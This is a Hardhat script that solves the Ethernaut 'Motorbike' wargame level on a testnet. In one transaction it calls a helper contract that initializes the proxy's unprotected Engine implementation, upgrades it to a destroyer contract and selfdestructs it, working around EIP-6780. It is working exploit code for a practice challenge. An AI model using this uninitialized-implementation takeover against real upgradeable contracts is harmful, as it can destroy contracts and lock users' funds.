import { ethers } from "hardhat";

/**
 * Execute the MotorbikeOneShot exploit - EIP-6780 compliant!
 * 
 * This creates and destroys Engine in ONE transaction
 * 
 * Usage:
 * ONESHOT_ADDRESS=0x... ETHERNAUT_ADDRESS=0x... LEVEL_ADDRESS=0x... ENGINE_ADDRESS=0x... npx hardhat run scripts/level-25-motorbike/execute-oneshot.ts --network sepolia
 */
async function main() {
  console.log("🚀 Executing MotorbikeOneShot exploit...\n");
  
  // Get addresses from environment
  const oneShotAddress = process.env.ONESHOT_ADDRESS;
  const ethernautAddress = process.env.ETHERNAUT_ADDRESS;
  const levelAddress = process.env.LEVEL_ADDRESS;
  const engineAddress = process.env.ENGINE_ADDRESS;
  
  if (!oneShotAddress) {
    throw new Error("ONESHOT_ADDRESS must be set");
  }
  if (!ethernautAddress) {
    throw new Error("ETHERNAUT_ADDRESS must be set (Ethernaut main contract)");
  }
  if (!levelAddress) {
    throw new Error("LEVEL_ADDRESS must be set (Motorbike level factory)");
  }
  if (!engineAddress) {
    console.log("\n⚠️  ENGINE_ADDRESS not provided!");
    console.log("\n📝 To find the Engine address:");
    console.log("   1. Create a test instance on Ethernaut");
    console.log("   2. Read storage from the proxy:");
    console.log("      const slot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';");
    console.log("      const engine = await ethers.provider.getStorage(proxyAddress, slot);");
    console.log("   3. Set ENGINE_ADDRESS and run again\n");
    throw new Error("ENGINE_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}\n`);
  
  try {
    // Connect to MotorbikeOneShot
    const oneShot = await ethers.getContractAt("MotorbikeOneShot", oneShotAddress);
    
    console.log("=== Configuration ===");
    console.log(`OneShot Contract: ${oneShotAddress}`);
    console.log(`Ethernaut: ${ethernautAddress}`);
    console.log(`Level: ${levelAddress}`);
    console.log(`Engine: ${engineAddress}`);
    
    // Check Engine code before exploit
    const engineCodeBefore = await ethers.provider.getCode(engineAddress);
    console.log(`\nEngine code size BEFORE: ${engineCodeBefore.length} bytes`);
    
    console.log("\n=== EIP-6780 Compliant One-Shot Exploit ===");
    console.log("This will happen in ONE transaction:");
    console.log("  1️⃣  Call Ethernaut.createLevelInstance()");
    console.log("     └─ Creates Engine + Proxy");
    console.log("  2️⃣  Call Engine.initialize()");
    console.log("     └─ Become upgrader");
    console.log("  3️⃣  Deploy Destroyer contract");
    console.log("  4️⃣  Call Engine.upgradeToAndCall(Destroyer, 'kill()')");
    console.log("     └─ Engine selfdestructs");
    console.log("  ✅  Same transaction = EIP-6780 allows destruction!\n");
    
    // Execute the exploit
    console.log("Executing exploit...");
    const tx = await oneShot.exploit(
      ethernautAddress,
      levelAddress,
      engineAddress,
      { value: ethers.parseEther("0.001") } // Small amount for instance creation
    );
    
    console.log(`Transaction hash: ${tx.hash}`);
    console.log("Waiting for confirmation...\n");
    
    const receipt = await tx.wait();
    console.log(`✅ Transaction confirmed in block: ${receipt?.blockNumber}\n`);
    
    // Parse events
    if (receipt?.logs) {
      for (const log of receipt.logs) {
        try {
          const parsedLog = oneShot.interface.parseLog(log);
          if (parsedLog && parsedLog.name === "InstanceCreated") {
            console.log(`📦 Instance Created: ${parsedLog.args[0]}`);
          }
          if (parsedLog && parsedLog.name === "EngineDestroyed") {
            console.log(`💥 Engine Destroyed: ${parsedLog.args[0]}`);
          }
        } catch (e) {
          // Not our event
        }
      }
    }
    
    // Verify Engine is destroyed
    console.log("\n=== Verification ===");
    const engineCodeAfter = await ethers.provider.getCode(engineAddress);
    console.log(`Engine code size AFTER: ${engineCodeAfter.length} bytes`);
    
    if (engineCodeAfter === "0x" || engineCodeAfter === "0x0") {
      console.log("\n🎉🎉🎉 SUCCESS! 🎉🎉🎉");
      console.log("\n✅ Engine has been DESTROYED!");
      console.log("✅ EIP-6780 compliant solution worked!");
      console.log("✅ Created and destroyed in SAME transaction!");
      console.log("\n🔑 Key Insight:");
      console.log("   By calling Ethernaut's createLevelInstance from our contract,");
      console.log("   Engine creation and destruction happened in ONE transaction.");
      console.log("   EIP-6780 allows selfdestruct in same tx as creation!");
      console.log("\n🏆 You've beaten EIP-6780 with clever contract design! 🏆");
    } else {
      console.log("\n⚠️  Engine code still exists");
      console.log("The exploit may have failed. Check:");
      console.log("  - Correct Engine address?");
      console.log("  - Ethernaut and Level addresses correct?");
      console.log("  - Transaction succeeded?");
    }
    
  } catch (error: any) {
    console.error("\n❌ Error executing exploit:");
    if (error.message) {
      console.error("Message:", error.message);
    }
    if (error.reason) {
      console.error("Reason:", error.reason);
    }
    throw error;
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
